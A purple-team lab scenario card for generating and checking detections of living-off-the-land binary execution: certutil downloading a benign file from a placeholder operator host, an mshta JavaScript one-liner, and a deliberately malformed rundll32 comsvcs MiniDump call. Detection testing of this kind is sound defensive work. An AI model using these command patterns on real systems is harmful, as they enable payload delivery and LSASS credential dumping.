# SC-04 — LOLBin execution

**ATT&CK:** T1105 (Ingress Tool Transfer via certutil), T1218.005
(mshta), T1218.011 (rundll32)

## Objective

Fetch and execute payloads with living-off-the-land binaries through
the framework shell — the telemetry of tool-less transfer and
proxy-execution.

## Prerequisites

- Interactive shell session.
- A benign payload reachable over HTTP from the VM. Serve one from the
  operator host:
  ```
  mkdir -p /tmp/www && echo test42 > /tmp/www/sample.bin && (cd /tmp/www && python3 -m http.server 8000 &)
  ```
  (Operator host firewall must allow the VM → :8000.)

## Procedure (operator console)

```
interact <session-prefix>
shell
```

In the shell (operator host IP `OP`):

```
certutil -urlcache -f http://OP:8000/sample.bin C:\\labs\sample.bin
certutil -hashfile C:\\labs\sample.bin SHA256
mshta.exe javascript:a=1;close();
rundll32.exe comsvcs.dll,#-560 fakeparam 4444
```

- The `mshta` line is the canonical benign-but-suspicious JS execution
  (it spawns and exits, no payload).
- The `rundll32 comsvcs` line is a **deliberately malformed** MiniDump
  invocation: it fires the LOLBin analytics without dumping real LSASS
  — keep it malformed; the real dump belongs to a credential-access
  scenario out of this range's scope.

## Expected host artifacts

- EID 1: `certutil.exe`, `mshta.exe`, `rundll32.exe` under the agent
  shell chain, full command lines.
- EID 3: certutil's outbound connection to the operator HTTP server.
- EID 11: `sample.bin` landing in `C:\\labs`.
- EID 22: DNS/conn telemetry if names were used.

## Expected detections

- `0caa33c9-b9da-43ae-ab46-068318375644` (lolbin-certutil).
- `90120763-6b76-4850-aedf-a6a2d57e7d28` (agent-spawns-shell).
- Your SIEM's mshta/rundll32 proxy-execution analytics.

## Cleanup

```
del C:\\labs\sample.bin
certutil -urlcache -f http://OP:8000/sample.bin delete
```
Kill the operator-side HTTP server (`kill %1` / pkill http.server).

## Coverage-report row

```
SC-04 | LOLBin execution | T1105,T1218.005,T1218.011 | exercised | detections: <what fired>
```
